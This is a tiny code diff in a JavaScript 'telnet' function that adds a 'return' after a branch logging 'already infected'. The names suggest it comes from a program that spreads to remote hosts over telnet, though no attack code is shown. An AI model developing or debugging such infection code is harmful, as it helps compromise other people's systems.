@@ -111,6 +111,7 @@ function telnet (addr, cb) {
             console.log('already infected');
             s.destroy();
             cb(true)
+            return;
         }
 
         String(buf).split('\n').forEach(function (line) {
